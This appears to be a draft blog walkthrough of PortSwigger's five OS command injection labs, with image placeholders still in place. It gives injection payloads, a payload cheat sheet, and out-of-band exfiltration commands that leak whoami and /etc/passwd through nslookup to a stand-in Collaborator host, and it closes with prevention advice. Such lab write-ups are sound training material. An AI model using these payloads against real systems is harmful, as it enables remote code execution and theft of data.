---
title: "PortSwigger OS Command Injection Labs — Complete Walkthrough"
date: 2026-09-22 07:10:00 +0000
categories: [Web Penetration Testing]
tags: [OS Command Injection, PortSwigger, Web Security Academy, RCE]
description: "All 5 PortSwigger OS command injection labs: in-band command execution plus blind time-delay, output-redirection and out-of-band (OAST) data exfiltration."
author: Paschal Sangawe
toc: true
---

OS command injection (also called shell injection) happens when an application passes user input into a system shell. Unlike SQL or path traversal, the payload is executed by the **operating system**, so a single injection typically means full RCE on the host. It usually appears wherever an app shells out — ping/traceroute tools, image/PDF converters, backup scripts, or any call to `system()`, `exec()`, `popen()` or `Runtime.exec()`.

This post covers all **5 PortSwigger OS command injection labs**, from trivial in-band execution to blind out-of-band exfiltration.

## Background — command separators

If a parameter is embedded in a shell command such as `ping -c 1 <input>`, we can chain our own command using a shell metacharacter:

| Separator | Behaviour |
|-----------|-----------|
| `;` | Run next command regardless |
| `\|` (pipe) | Send output of left into right; runs both |
| `\|\|` | Run right only if left fails (logical OR) |
| `&&` | Run right only if left succeeds (logical AND) |
| `&` | Run left in background, then right |
| `` `cmd` `` / `$(cmd)` | Command substitution — embeds output inline |
| newline (`%0a`) | Ends the command, starts a new one |

Which one works depends on the surrounding command, how the app handles quotes, and the OS (Linux vs Windows uses `&`/`&&`/`|` and `%VAR%`).

## Lab 1 — OS command injection, simple case
> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `storeID=1|whoami`.
> _Save as_ `images/portswigger-os-command-injection-labs/1.png` _then replace this block with_ `![Lab 1 — OS command injection, simple case](/images/portswigger-os-command-injection-labs/1.png)`_._


**Difficulty:** Apprentice
**Goal:** Execute `whoami` and read its output.

The stock-check feature passes the `storeID` into a shell command. Inject directly and the output is reflected in the response:

```text
storeID=1|whoami
```

The pipe runs `whoami` and the current username appears in the stock-level response.

> **Picture goes here (#2).** `storeID=1|whoami` request with the username in the response.
> _Save as_ `images/portswigger-os-command-injection-labs/2.png` _then replace this block with_ `![Lab 1 — OS command injection, simple case](/images/portswigger-os-command-injection-labs/2.png)`_._

## Lab 2 — Blind OS command injection with time delays
> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `email=x||ping+-c+10+127.0.0.1||`.
> _Save as_ `images/portswigger-os-command-injection-labs/3.png` _then replace this block with_ `![Lab 2 — Blind OS command injection with time delays](/images/portswigger-os-command-injection-labs/3.png)`_._


**Difficulty:** Apprentice
**Goal:** Prove command execution when nothing is reflected.

The feedback form passes the `email` parameter to a shell command. There is no output in the response, so we use a **time delay** as the oracle:

```text
email=x||ping+-c+10+127.0.0.1||
```

(URL-encoded: the spaces are `+`.) The response now takes about 10 seconds — confirming the command ran.

> **Why `||`:** the original command likely fails because `x` is not a valid argument, so the `||` branch executes our `ping`.

Other delay primitives: `sleep 10` (Linux), `timeout 10` / `ping -n 10 127.0.0.1` (Windows), `sleep 10 &` to background it.

> **Picture goes here (#4).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/portswigger-os-command-injection-labs/4.png` _then replace this block with_ `![Lab 2 — Blind OS command injection with time delays](/images/portswigger-os-command-injection-labs/4.png)`_._

## Lab 3 — Blind OS command injection with output redirection
> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `email=||whoami>/var/www/images/output.txt||`.
> _Save as_ `images/portswigger-os-command-injection-labs/5.png` _then replace this block with_ `![Lab 3 — Blind OS command injection with output redirection](/images/portswigger-os-command-injection-labs/5.png)`_._


**Difficulty:** Practitioner
**Goal:** Capture command output when it is not returned in the response.

We redirect the command's output into a file inside the web root, then fetch that file through a separate feature.

**Step 1** — inject and redirect into a writable, web-served directory:

```text
email=||whoami>/var/www/images/output.txt||
```

**Step 2** — load a product image, but swap the filename for the file we created:

```text
filename=output.txt
```

**Step 3** — the image request now returns the file contents, i.e. the `whoami` output.

> **Picture goes here (#6).** The `filename=output.txt` request returning the redirected command output.
> _Save as_ `images/portswigger-os-command-injection-labs/6.png` _then replace this block with_ `![Lab 3 — Blind OS command injection with output redirection](/images/portswigger-os-command-injection-labs/6.png)`_._

## Lab 4 — Blind OS command injection with out-of-band interaction
> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`.
> _Save as_ `images/portswigger-os-command-injection-labs/7.png` _then replace this block with_ `![Lab 4 — Blind OS command injection with out-of-band interaction](/images/portswigger-os-command-injection-labs/7.png)`_._


**Difficulty:** Practitioner
**Goal:** Trigger an external DNS lookup when timing and output channels are unavailable.

The command is executed **asynchronously** and does not affect the response at all — so neither reflected output nor timing helps. Out-of-band (OAST) is the answer. Use `nslookup` to force a DNS request to Burp Collaborator:

```text
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```

In Burp, select the placeholder and choose **Insert Collaborator payload**, send the request, then poll Collaborator for a DNS/HTTP interaction.

> **Using Community Edition:** Collaborator requires Burp Professional. A self-hosted OAST server such as `interactsh` or a `canarytokens.org` token works the same way — substitute its hostname.

> **Picture goes here (#8).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/portswigger-os-command-injection-labs/8.png` _then replace this block with_ `![Lab 4 — Blind OS command injection with out-of-band interaction](/images/portswigger-os-command-injection-labs/8.png)`_._

## Lab 5 — Blind OS command injection with out-of-band data exfiltration
> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `whoami`.
> _Save as_ `images/portswigger-os-command-injection-labs/9.png` _then replace this block with_ `![Lab 5 — Blind OS command injection with out-of-band data exfiltration](/images/portswigger-os-command-injection-labs/9.png)`_._


**Difficulty:** Practitioner
**Goal:** Leak the output of a command through DNS.

Same OAST technique, but now we embed command output in the looked-up hostname using backticks:

```text
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

Poll Collaborator; the DNS interaction's subdomain contains the username. To read a file, replace `whoami` with `cat /etc/passwd` or similar:

```text
email=||nslookup+`cat+/etc/passwd`.BURP-COLLABORATOR-SUBDOMAIN||
```

> **Picture goes here (#10).** Collaborator interaction where the subdomain holds the exfiltrated output.
> _Save as_ `images/portswigger-os-command-injection-labs/10.png` _then replace this block with_ `![Lab 5 — Blind OS command injection with out-of-band data exfiltration](/images/portswigger-os-command-injection-labs/10.png)`_._

## Cheat sheet

| Channel | Example payload |
|---------|-----------------|
| In-band (reflected) | `1\|whoami` |
| In-band (subshell) | `1;whoami` / `` 1`whoami` `` |
| Time delay | `x\|\|ping+-c+10+127.0.0.1\|\|` |
| Output redirection | `\|\|whoami>/var/www/images/out.txt\|\|` |
| OAST interaction | `x\|\|nslookup+x.COLLABORATOR\|\|` |
| OAST exfiltration | `` x\|\|nslookup+`whoami`.COLLABORATOR\|\| `` |

## Prevention

- **Avoid the shell entirely.** Use language-native APIs (e.g. `ProcessBuilder` with an argument list, Python `subprocess.run([...], shell=False)`) so user input cannot be interpreted as shell syntax.
- If a shell is unavoidable, validate the input against a strict **allow-list** (e.g. only `[a-zA-Z0-9.]` for a hostname) and never concatenate raw input.
- Escape/quote correctly for the target shell — but treat this as defence in depth, not the primary fix.
- Run the application with **least privilege** so a compromise is contained, and restrict outbound network/DNS egress to blunt OAST exfiltration.

## Related posts

- [File Upload labs](/posts/portswigger-file-upload-labs/)
- [Path Traversal / File Inclusion labs](/posts/portswigger-path-traversal-labs/)
- [SQL Injection lab series](/posts/portswigger-sqli-part-1-basics/)
